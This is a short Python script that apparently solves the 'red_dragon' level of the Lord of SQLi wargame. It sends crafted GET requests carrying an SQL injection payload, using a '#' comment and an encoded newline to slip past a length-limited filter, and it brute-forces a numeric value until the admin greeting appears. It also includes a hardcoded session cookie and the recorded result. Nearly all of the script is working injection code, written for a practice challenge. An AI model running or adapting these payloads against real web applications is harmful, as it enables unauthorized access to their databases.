from requests import Session, request

URL = "https://los.rubiya.kr/chall/red_dragon_b787de2bfe6bc3454e2391c4e7bb5de8.php"
session = {"PHPSESSID": "c8o4nup8pn2fn76vsh9mlrmrni"}
"""
https://los.rubiya.kr/chall/red_dragon_b787de2bfe6bc3454e2391c4e7bb5de8.php?id=%27admin%27&no=10
"""

NoLength = 9
NoScope = ""

"""
999999999 > no > 99999999
1000000000

"""


def getNo():
    # global NoLength
    No = 000000000

    for i in range(586482013, 586483000):
        payload = f"?id=%27||no>%23&no=%0a{i}"
        res = request(method='GET', url=URL + payload, cookies=session)

        if "Hello admin" in res.text:
            No = i
            print(f"[*]Find !!")
            break

    print(f"[*]No :: {No}")


if __name__ == '__main__':
    getNo()
    """
    [*]Find !!
    [*]No :: 586482013 + 1;;;;
    """

